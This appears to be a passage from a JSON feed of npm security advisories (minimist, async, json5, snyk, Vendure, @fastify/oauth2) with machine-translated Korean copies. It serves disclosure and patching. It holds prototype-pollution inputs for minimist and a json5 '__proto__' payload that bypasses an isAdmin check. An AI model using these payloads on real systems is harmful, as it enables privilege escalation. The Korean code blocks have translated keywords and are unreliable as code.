    "updatedAt": "2023-07-07T18:36:02Z",
    "publishedAt": "2020-04-03T21:48:32Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7598\nhttps://snyk.io/vuln/SNYK-JS-MINIMIST-559764\nhttp://lists.opensuse.org/opensuse-security-announce/2020-06/msg00024.html\nhttps://www.npmjs.com/advisories/1179\nhttps://github.com/minimistjs/minimist/commit/10bd4cdf49d9686d48214be9d579a9cdfda37c68\nhttps://github.com/minimistjs/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab\nhttps://github.com/minimistjs/minimist/commit/4cf1354839cb972e38496d35e12f806eea92c11f#diff-a1e0ee62c91705696ddb71aa30ad4f95\nhttps://github.com/minimistjs/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94\nhttps://github.com/advisories/GHSA-vh95-rmgr-6w4m",
    "name": "minimist",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.1",
    "identifier": "0.2.1",
    "descriptionKR": "영향을 받은 `minimist` 버전은 프로토타입 오염에 취약합니다. 인수가 제대로 정리되지 않아 공격자가 '객체'의 프로토타입을 수정하여 모든 객체에 존재할 기존 속성을 추가하거나 수정할 수 있습니다.\n인수 `--__proto__.y=Polluted`를 구문 분석하면 값이 `Polluted`인 `y` 속성이 모든 개체에 추가됩니다. 인수 `--__proto__=Polluted`는 잡히지 않은 오류를 발생시키고 애플리케이션을 충돌시킵니다.\n이는 공격자가 `minimist`에 전달되는 인수를 제어할 수 있는 경우 악용될 수 있습니다.\n\n\n\n## 추천\n\n버전 0.2.1, 1.2.3 이상으로 업그레이드하십시오."
  },
  {
    "description": "A vulnerability exists in Async through 3.2.1 for 3.x and through 2.6.3 for 2.x (fixed in 3.2.2 and 2.6.4), which could let a malicious user obtain privileges via the `mapValues()` method.",
    "identifiers": "GHSA : GHSA-fwr7-v2mv-hh25\nCVE : CVE-2021-43138",
    "severity": "HIGH",
    "updatedAt": "2023-07-07T18:19:47Z",
    "publishedAt": "2022-04-07T00:00:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-43138\nhttps://github.com/caolan/async/commit/e1ecdbf79264f9ab488c7799f4c76996d5dca66d\nhttps://github.com/caolan/async/blob/master/lib/internal/iterator.js\nhttps://github.com/caolan/async/blob/master/lib/mapValuesLimit.js\nhttps://jsfiddle.net/oz5twjd9/\nhttps://github.com/caolan/async/pull/1828\nhttps://github.com/caolan/async/commit/8f7f90342a6571ba1c197d747ebed30c368096d2\nhttps://github.com/caolan/async/blob/v2.6.4/CHANGELOG.md#v264\nhttps://github.com/caolan/async/compare/v2.6.3...v2.6.4\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MTEUUTNIEBHGKUKKLNUZSV7IEP6IP3Q3/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UM6XJ73Q3NAM5KSGCOKJ2ZIA6GUWUJLK/\nhttps://github.com/advisories/GHSA-fwr7-v2mv-hh25",
    "name": "async",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.6.4",
    "identifier": "2.6.4",
    "descriptionKR": "Async에는 3.x의 경우 3.2.1까지, 2.x의 경우 2.6.3까지(3.2.2 및 2.6.4에서 수정됨) 악의적인 사용자가 `mapValues()` 메서드를 통해 권한을 얻을 수 있는 취약점이 있습니다. ."
  },
  {
    "description": "A vulnerability exists in Async through 3.2.1 for 3.x and through 2.6.3 for 2.x (fixed in 3.2.2 and 2.6.4), which could let a malicious user obtain privileges via the `mapValues()` method.",
    "identifiers": "GHSA : GHSA-fwr7-v2mv-hh25\nCVE : CVE-2021-43138",
    "severity": "HIGH",
    "updatedAt": "2023-07-07T18:19:47Z",
    "publishedAt": "2022-04-07T00:00:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-43138\nhttps://github.com/caolan/async/commit/e1ecdbf79264f9ab488c7799f4c76996d5dca66d\nhttps://github.com/caolan/async/blob/master/lib/internal/iterator.js\nhttps://github.com/caolan/async/blob/master/lib/mapValuesLimit.js\nhttps://jsfiddle.net/oz5twjd9/\nhttps://github.com/caolan/async/pull/1828\nhttps://github.com/caolan/async/commit/8f7f90342a6571ba1c197d747ebed30c368096d2\nhttps://github.com/caolan/async/blob/v2.6.4/CHANGELOG.md#v264\nhttps://github.com/caolan/async/compare/v2.6.3...v2.6.4\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MTEUUTNIEBHGKUKKLNUZSV7IEP6IP3Q3/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UM6XJ73Q3NAM5KSGCOKJ2ZIA6GUWUJLK/\nhttps://github.com/advisories/GHSA-fwr7-v2mv-hh25",
    "name": "async",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.2.2",
    "identifier": "3.2.2",
    "descriptionKR": "Async에는 3.x의 경우 3.2.1까지, 2.x의 경우 2.6.3까지(3.2.2 및 2.6.4에서 수정됨) 악의적인 사용자가 `mapValues()` 메서드를 통해 권한을 얻을 수 있는 취약점이 있습니다. ."
  },
  {
    "description": "The `parse` method of the JSON5 library before and including version `2.2.1` does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object.\n\nThis vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.\n\n## Impact\nThis vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\n \nSuppose a developer wants to allow users and admins to perform some risky operation, but they want to restrict what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys, and then performs the risky operation using the validated data:\n \n```js\nconst JSON5 = require('json5');\n\nconst doSomethingDangerous = (props) => {\n  if (props.isAdmin) {\n    console.log('Doing dangerous thing as admin.');\n  } else {\n    console.log('Doing dangerous thing as user.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((key) => {\n    if (searchKeys.indexOf(key) > -1) {\n      searchKeyFound = true;\n    }\n  });\n  return searchKeyFound;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as user.\"\n} else {\n  throw new Error('Forbidden...');\n}\n```\n \nIf the user attempts to set the `isAdmin` key, their request will be rejected:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} else {\n  throw new Error('Forbidden...'); // Error: Forbidden...\n}\n```\n \nHowever, users can instead set the `__proto__` key to `{\"isAdmin\": true}`. `JSON5` will parse this key and will set the `isAdmin` key on the prototype of the returned object, allowing the user to bypass the security check and run their request as an admin:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as admin.\"\n} else {\n  throw new Error('Forbidden...');\n}\n ```",
    "identifiers": "GHSA : GHSA-9c47-m6qq-7p4h\nCVE : CVE-2022-46175",
    "severity": "HIGH",
    "updatedAt": "2023-07-07T18:17:19Z",
    "publishedAt": "2022-12-29T01:51:03Z",
    "references": "https://github.com/json5/json5/security/advisories/GHSA-9c47-m6qq-7p4h\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-46175\nhttps://github.com/json5/json5/issues/199\nhttps://github.com/json5/json5/issues/295\nhttps://github.com/json5/json5/pull/298\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3S26TLPLVFAJTUN3VIXFDEBEXDYO22CE/\nhttps://github.com/json5/json5/commit/62a65408408d40aeea14c7869ed327acead12972\nhttps://github.com/json5/json5/commit/7774c1097993bc3ce9f0ac4b722a32bf7d6871c8\nhttps://github.com/advisories/GHSA-9c47-m6qq-7p4h",
    "name": "json5",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.2",
    "identifier": "1.0.2",
    "descriptionKR": "버전 `2.2.1` 이전 및 포함된 JSON5 라이브러리의 `parse` 메서드는 `__proto__`라는 이름의 키 구문 분석을 제한하지 않으므로 특별히 제작된 문자열이 결과 객체의 프로토타입을 오염시킬 수 있습니다.\n\n이 취약점은 'JSON5.parse'에 의해 반환된 개체의 프로토타입을 오염시키고 Prototype Pollution의 일반적으로 이해되는 정의인 전역 개체 프로토타입을 오염시킵니다. 그러나 개체가 나중에 신뢰할 수 있는 작업에 사용되는 경우 단일 개체의 프로토타입을 오염시키면 응용 프로그램에 심각한 보안 영향을 미칠 수 있습니다.\n\n## 영향\n이 취약점으로 인해 공격자는 'JSON5.parse'에서 반환된 개체에 임의의 예기치 않은 키를 설정할 수 있습니다. 실제 영향은 애플리케이션이 반환된 개체를 활용하는 방법과 원하지 않는 키를 필터링하는 방법에 따라 다르지만 서비스 거부, 교차 사이트 스크립팅, 권한 상승 및 극단적인 경우 원격 코드 실행이 포함될 수 있습니다.\n\n## 완화\n이 취약점은 json5 v2.2.2 이상에서 패치되었습니다. 버전 v1.0.2 이상에서 json5 v1용 패치도 백포트되었습니다.\n\n## 세부 정보\n \n개발자가 사용자와 관리자가 일부 위험한 작업을 수행하도록 허용하고 싶지만 관리자가 아닌 사용자가 수행할 수 있는 작업을 제한하려고 한다고 가정합니다. 이를 달성하기 위해 그들은 사용자로부터 JSON blob을 수락하고 `JSON5.parse`를 사용하여 구문 분석하고 제공된 데이터가 일부 민감한 키를 설정하지 않았는지 확인한 다음 검증된 데이터를 사용하여 위험한 작업을 수행합니다.\n \n```js\nconst JSON5 = 요구('json5');\n\nconst doSomethingDangerous = (소품) => {\n  if (props.isAdmin) {\n    console.log('관리자로서 위험한 일을 하고 있습니다.');\n  } 또 다른 {\n    console.log('사용자로서 위험한 일을 하고 있습니다.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((키) => {\n    if (searchKeys.indexOf(키) > -1) {\n      searchKeyFound = 참;\n    }\n  });\n  searchKeyFound 반환;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"사용자로서 위험한 일을 하고 있습니다.\"\n} 또 다른 {\n  throw new Error('금지됨...');\n}\n```\n \n사용자가 `isAdmin` 키를 설정하려고 하면 요청이 거부됩니다.\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} 또 다른 {\n  throw new Error('금지됨...'); // 오류: 금지됨...\n}\n```\n \n그러나 사용자는 대신 `__proto__` 키를 `{\"isAdmin\": true}`로 설정할 수 있습니다. 'JSON5'는 이 키를 구문 분석하고 반환된 객체의 프로토타입에 'isAdmin' 키를 설정하여 사용자가 보안 검사를 우회하고 관리자로서 요청을 실행할 수 있도록 합니다.\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"관리자로서 위험한 일을 하고 있습니다.\"\n} 또 다른 {\n  throw new Error('금지됨...');\n}\n ```"
  },
  {
    "description": "The `parse` method of the JSON5 library before and including version `2.2.1` does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object.\n\nThis vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.\n\n## Impact\nThis vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\n \nSuppose a developer wants to allow users and admins to perform some risky operation, but they want to restrict what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys, and then performs the risky operation using the validated data:\n \n```js\nconst JSON5 = require('json5');\n\nconst doSomethingDangerous = (props) => {\n  if (props.isAdmin) {\n    console.log('Doing dangerous thing as admin.');\n  } else {\n    console.log('Doing dangerous thing as user.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((key) => {\n    if (searchKeys.indexOf(key) > -1) {\n      searchKeyFound = true;\n    }\n  });\n  return searchKeyFound;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as user.\"\n} else {\n  throw new Error('Forbidden...');\n}\n```\n \nIf the user attempts to set the `isAdmin` key, their request will be rejected:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} else {\n  throw new Error('Forbidden...'); // Error: Forbidden...\n}\n```\n \nHowever, users can instead set the `__proto__` key to `{\"isAdmin\": true}`. `JSON5` will parse this key and will set the `isAdmin` key on the prototype of the returned object, allowing the user to bypass the security check and run their request as an admin:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as admin.\"\n} else {\n  throw new Error('Forbidden...');\n}\n ```",
    "identifiers": "GHSA : GHSA-9c47-m6qq-7p4h\nCVE : CVE-2022-46175",
    "severity": "HIGH",
    "updatedAt": "2023-07-07T18:17:19Z",
    "publishedAt": "2022-12-29T01:51:03Z",
    "references": "https://github.com/json5/json5/security/advisories/GHSA-9c47-m6qq-7p4h\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-46175\nhttps://github.com/json5/json5/issues/199\nhttps://github.com/json5/json5/issues/295\nhttps://github.com/json5/json5/pull/298\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3S26TLPLVFAJTUN3VIXFDEBEXDYO22CE/\nhttps://github.com/json5/json5/commit/62a65408408d40aeea14c7869ed327acead12972\nhttps://github.com/json5/json5/commit/7774c1097993bc3ce9f0ac4b722a32bf7d6871c8\nhttps://github.com/advisories/GHSA-9c47-m6qq-7p4h",
    "name": "json5",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.2.2",
    "identifier": "2.2.2",
    "descriptionKR": "버전 `2.2.1` 이전 및 포함된 JSON5 라이브러리의 `parse` 메서드는 `__proto__`라는 이름의 키 구문 분석을 제한하지 않으므로 특별히 제작된 문자열이 결과 객체의 프로토타입을 오염시킬 수 있습니다.\n\n이 취약점은 'JSON5.parse'에 의해 반환된 개체의 프로토타입을 오염시키고 Prototype Pollution의 일반적으로 이해되는 정의인 전역 개체 프로토타입을 오염시킵니다. 그러나 개체가 나중에 신뢰할 수 있는 작업에 사용되는 경우 단일 개체의 프로토타입을 오염시키면 응용 프로그램에 심각한 보안 영향을 미칠 수 있습니다.\n\n## 영향\n이 취약점으로 인해 공격자는 'JSON5.parse'에서 반환된 개체에 임의의 예기치 않은 키를 설정할 수 있습니다. 실제 영향은 애플리케이션이 반환된 개체를 활용하는 방법과 원하지 않는 키를 필터링하는 방법에 따라 다르지만 서비스 거부, 교차 사이트 스크립팅, 권한 상승 및 극단적인 경우 원격 코드 실행이 포함될 수 있습니다.\n\n## 완화\n이 취약점은 json5 v2.2.2 이상에서 패치되었습니다. 버전 v1.0.2 이상에서 json5 v1용 패치도 백포트되었습니다.\n\n## 세부 정보\n \n개발자가 사용자와 관리자가 일부 위험한 작업을 수행하도록 허용하고 싶지만 관리자가 아닌 사용자가 수행할 수 있는 작업을 제한하려고 한다고 가정합니다. 이를 달성하기 위해 그들은 사용자로부터 JSON blob을 수락하고 `JSON5.parse`를 사용하여 구문 분석하고 제공된 데이터가 일부 민감한 키를 설정하지 않았는지 확인한 다음 검증된 데이터를 사용하여 위험한 작업을 수행합니다.\n \n```js\nconst JSON5 = 요구('json5');\n\nconst doSomethingDangerous = (소품) => {\n  if (props.isAdmin) {\n    console.log('관리자로서 위험한 일을 하고 있습니다.');\n  } 또 다른 {\n    console.log('사용자로서 위험한 일을 하고 있습니다.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((키) => {\n    if (searchKeys.indexOf(키) > -1) {\n      searchKeyFound = 참;\n    }\n  });\n  searchKeyFound 반환;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"사용자로서 위험한 일을 하고 있습니다.\"\n} 또 다른 {\n  throw new Error('금지됨...');\n}\n```\n \n사용자가 `isAdmin` 키를 설정하려고 하면 요청이 거부됩니다.\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} 또 다른 {\n  throw new Error('금지됨...'); // 오류: 금지됨...\n}\n```\n \n그러나 사용자는 대신 `__proto__` 키를 `{\"isAdmin\": true}`로 설정할 수 있습니다. 'JSON5'는 이 키를 구문 분석하고 반환된 객체의 프로토타입에 'isAdmin' 키를 설정하여 사용자가 보안 검사를 우회하고 관리자로서 요청을 실행할 수 있도록 합니다.\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"관리자로서 위험한 일을 하고 있습니다.\"\n} 또 다른 {\n  throw new Error('금지됨...');\n}\n ```"
  },
  {
    "description": "is.js is a general-purpose check library. Versions 0.9.0 and prior contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS). is.js uses a regex copy-pasted from a gist to validate URLs. Trying to validate a malicious string can cause the regex to loop \"forever.\" This vulnerability was found using a CodeQL query which identifies inefficient regular expressions. is.js has no patch for this issue.",
    "identifiers": "GHSA : GHSA-pvrw-g6fx-mcx2\nCVE : CVE-2020-26302",
    "severity": "HIGH",
    "updatedAt": "2023-07-06T21:46:36Z",
    "publishedAt": "2023-07-06T19:24:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-26302\nhttps://github.com/arasatasaygin/is.js/issues/320\nhttps://securitylab.github.com/advisories/GHSL-2020-295-redos-is.js\nhttps://github.com/advisories/GHSA-pvrw-g6fx-mcx2",
    "name": "is_js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.9.0",
    "descriptionKR": "is.js는 범용 검사 라이브러리입니다. 0.9.0 이전 버전에는 ReDoS(Regular Expression Denial of Service)에 취약한 하나 이상의 정규식이 포함되어 있습니다. is.js는 요지에서 복사하여 붙여넣은 정규식을 사용하여 URL의 유효성을 검사합니다. 악의적인 문자열의 유효성을 검사하려고 하면 정규식이 \"영원히\" 반복될 수 있습니다. 이 취약점은 비효율적인 정규식을 식별하는 CodeQL 쿼리를 사용하여 발견되었습니다. is.js는 이 문제에 대한 패치가 없습니다."
  },
  {
    "description": "The package snyk before 1.1064.0 is vulnerable to Code Injection when analyzing a project. An attacker who can convince a user to scan a malicious project can include commands in a build file such as build.gradle or gradle-wrapper.jar, which will be executed with the privileges of the application. This vulnerability may be triggered when running the the CLI tool directly, or when running a scan with one of the IDE plugins that invoke the Snyk CLI. Successful exploitation of this issue would likely require some level of social engineering - to coerce an untrusted project to be downloaded and analyzed via the Snyk CLI or opened in an IDE where a Snyk IDE plugin is installed and enabled. Additionally, if the IDE has a Trust feature then the target folder must be marked as ‘trusted’ in order to be vulnerable.\n\n**NOTE:** This issue is independent of the one reported in [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342), and upgrading to a fixed version for this addresses that issue as well.\n\nThe affected IDE plugins and versions are: \n- VS Code - Affected: <=1.8.0, Fixed: 1.9.0 \n- IntelliJ - Affected: <=2.4.47, Fixed: 2.4.48 \n- Visual Studio - Affected: <=1.1.30, Fixed: 1.1.31 \n- Eclipse - Affected: <=v20221115.132308, Fixed: All subsequent versions \n- Language Server - Affected: <=v20221109.114426, Fixed: All subsequent versions",
    "identifiers": "GHSA : GHSA-4vrv-93c7-m92j\nCVE : CVE-2022-24441",
    "severity": "HIGH",
    "updatedAt": "2023-07-06T21:36:20Z",
    "publishedAt": "2023-07-06T19:24:04Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24441\nhttps://github.com/snyk/snyk-eclipse-plugin/commit/b5a8bce25a359ced75f83a729fc6b2393fc9a495\nhttps://github.com/snyk/snyk-intellij-plugin/commit/56682f4ba6081ce1d95cb980cbfacd3809a826f4\nhttps://github.com/snyk/snyk-ls/commit/b3229f0142f782871aa72d1a7dcf417546d568ed\nhttps://github.com/snyk/snyk-visual-studio-plugin/commit/0b53dbbd4a3153c3ef9aaf797af3b5caad0f731a\nhttps://github.com/snyk/vscode-extension/commit/0db3b4240be0db6a0a5c6d02c0d4231a2c4ba708\nhttps://security.snyk.io/vuln/SNYK-JS-SNYK-3111871\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-4vrv-93c7-m92j",
    "name": "snyk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1064.0",
    "identifier": "1.1064.0",
    "descriptionKR": "1.1064.0 이전 패키지 snyk는 프로젝트 분석 시 코드 인젝션에 취약합니다. 사용자가 악성 프로젝트를 스캔하도록 유도할 수 있는 공격자는 build.gradle 또는 gradle-wrapper.jar와 같은 빌드 파일에 명령을 포함할 수 있으며, 이 명령은 애플리케이션의 권한으로 실행됩니다. 이 취약점은 CLI 도구를 직접 실행하거나 Snyk CLI를 호출하는 IDE 플러그인 중 하나로 스캔을 실행할 때 트리거될 수 있습니다. 이 문제를 성공적으로 악용하려면 신뢰할 수 없는 프로젝트를 Snyk CLI를 통해 다운로드 및 분석하거나 Snyk IDE 플러그인이 설치 및 활성화된 IDE에서 열도록 강제하기 위해 일정 수준의 사회 공학이 필요할 수 있습니다. 또한 IDE에 신뢰 기능이 있는 경우 대상 폴더를 '신뢰할 수 있음'으로 표시해야 취약해집니다.\n\n**참고:** 이 문제는 [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342)에서 보고된 문제와 별개이며 수정된 버전으로 업그레이드됩니다. 이것은 해당 문제도 해결합니다.\n\n영향을 받는 IDE 플러그인 및 버전은 다음과 같습니다.\n- VS Code - 영향 받음: <=1.8.0, 고정됨: 1.9.0\n- IntelliJ - 영향 받음: <=2.4.47, 수정됨: 2.4.48\n- Visual Studio - 영향 받음: <=1.1.30, 수정됨: 1.1.31\n- Eclipse - 영향 받음: <=v20221115.132308, 수정됨: 모든 후속 버전\n- 언어 서버 - 영향 받음: <=v20221109.114426, 수정됨: 모든 후속 버전"
  },
  {
    "description": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-g8x5-p9qc-cf95. This link is maintained to preserve external references.\n\n## Original Description\nAll versions of @fastify/oauth2 used a statically generated state parameter at startup time and were used across all requests for all users. The purpose of the Oauth2 state parameter is to prevent Cross-Site-Request-Forgery attacks. As such, it should be unique per user and should be connected to the user's session in some way that will allow the server to validate it.\n\nv7.2.0 changes the default behavior to store the state in a cookie with the http-only and same-site=lax attributes set. The state is now by default generated for every user. Note that this contains a breaking change in the checkStateFunction function, which now accepts the full Request object.",
    "identifiers": "GHSA : GHSA-hgxv-3497-3hhj",
    "severity": "MODERATE",
    "updatedAt": "2023-07-06T20:39:14Z",
    "publishedAt": "2023-07-04T18:30:58Z",
    "withdrawnAt": "2023-07-06T20:38:21Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-31999\nhttps://hackerone.com/reports/2020418\nhttps://auth0.com/docs/secure/attack-protection/state-parameters\nhttps://github.com/fastify/fastify-oauth2/releases/tag/v7.2.0\nhttps://github.com/advisories/GHSA-hgxv-3497-3hhj",
    "name": "@fastify/oauth2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.2.0",
    "identifier": "7.2.0",
    "descriptionKR": "## 중복 자문\n이 권고는 GHSA-g8x5-p9qc-cf95와 중복되기 때문에 철회되었습니다. 이 링크는 외부 참조를 보존하기 위해 유지됩니다.\n\n## 원본 설명\n@fastify/oauth2의 모든 버전은 시작 시 정적으로 생성된 상태 매개변수를 사용했으며 모든 사용자에 대한 모든 요청에서 사용되었습니다. Oauth2 상태 매개변수의 목적은 Cross-Site-Request-Forgery 공격을 방지하는 것입니다. 따라서 사용자마다 고유해야 하며 서버에서 유효성을 검사할 수 있는 방식으로 사용자의 세션에 연결되어야 합니다.\n\nv7.2.0은 기본 동작을 변경하여 http-only 및 same-site=lax 속성이 설정된 쿠키에 상태를 저장합니다. 이제 기본적으로 모든 사용자에 대해 상태가 생성됩니다. 여기에는 이제 전체 Request 객체를 허용하는 checkStateFunction 함수의 주요 변경 사항이 포함되어 있습니다."
  },
  {
    "description": "### Impact\nVendure provides an authorization system with different levels of privileges. For example, an administrator cannot create another administrator.\n\nIn the admin UI, there are a couple of places with description inputs, such as inventory/collection catalog, shipping methods, promotions, and more.\n\nWhile the WYSIWYG editor allows limited customization, altering the request data (not in the ui) saves and returns arbitrary HTML with no sanitization. Causing an XSS when viewing the page.\n\nThe impact of this XSS is privilege escalation. A user that can write any type of description can trigger the attack. Then any other user that visits the vulnerable page is prone to arbitrary Javascript code execution, giving the attacker ability to execute actions on behalf of this user.\n\n### Patches\nin progress\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n### References\n_Are there any links users can visit to find out more?_\n",
    "identifiers": "GHSA : GHSA-gm68-572p-q28r",
    "severity": "MODERATE",
    "updatedAt": "2023-07-06T15:30:51Z",
    "publishedAt": "2023-07-06T15:30:51Z",
    "references": "https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-gm68-572p-q28r\nhttps://github.com/vendure-ecommerce/vendure/commit/0cdc92b241e6fd4017ddfc9fbdca189fc7c1ada0\nhttps://github.com/vendure-ecommerce/vendure/blob/master/CHANGELOG.md#203-2023-07-04\nhttps://github.com/advisories/GHSA-gm68-572p-q28r",
    "name": "@vendure/admin-ui-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.3",
    "identifier": "2.0.3",
    "descriptionKR": "### 영향\nVendure는 다양한 수준의 권한을 가진 인증 시스템을 제공합니다. 예를 들어 관리자는 다른 관리자를 생성할 수 없습니다.\n\n관리자 UI에는 인벤토리/수집 카탈로그, 배송 방법, 프로모션 등과 같은 설명 입력이 있는 몇 개의 위치가 있습니다.\n\nWYSIWYG 편집기는 제한된 사용자 정의를 허용하지만 요청 데이터(UI가 아님)를 변경하면 삭제 없이 임의의 HTML을 저장하고 반환합니다. 페이지를 볼 때 XSS가 발생합니다.\n\n이 XSS의 영향은 권한 에스컬레이션입니다. 모든 유형의 설명을 작성할 수 있는 사용자는 공격을 트리거할 수 있습니다. 그런 다음 취약한 페이지를 방문하는 다른 사용자는 임의의 Javascript 코드를 실행하기 쉬워 공격자가 이 사용자를 대신하여 작업을 실행할 수 있습니다.\n\n### 패치\n진행 중\n\n### 해결 방법\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_"
  },
  {
    "description": "### Impact\n\nAll versions of @fastify/oauth2 used a statically generated `state` parameter at startup time and were used across all requests for all users.\nThe purpose of the Oauth2 `state` parameter is to prevent Cross-Site-Request-Forgery attacks. As such, it should be unique per user and should be connected to the user's session in some way that will allow the server to validate it.\n\n### Patches\n\nv7.2.0 changes the default behavior to store the `state` in a cookie with the `http-only` and `same-site=lax` attributes set. The state is now by default generated for every user.\n\nNote that this contains a breaking change in the `checkStateFunction` function, which now accepts the full `Request` object.\n\n### Workarounds\n\nThere are no known workarounds.\n\n### References\n\n* [Prevent Attacks and Redirect Users with OAuth 2.0 State Parameters](https://auth0.com/docs/secure/attack-protection/state-parameters)\n",
    "identifiers": "GHSA : GHSA-g8x5-p9qc-cf95\nCVE : CVE-2023-31999",
    "severity": "HIGH",
    "updatedAt": "2023-07-06T20:39:30Z",
    "publishedAt": "2023-07-05T21:36:56Z",
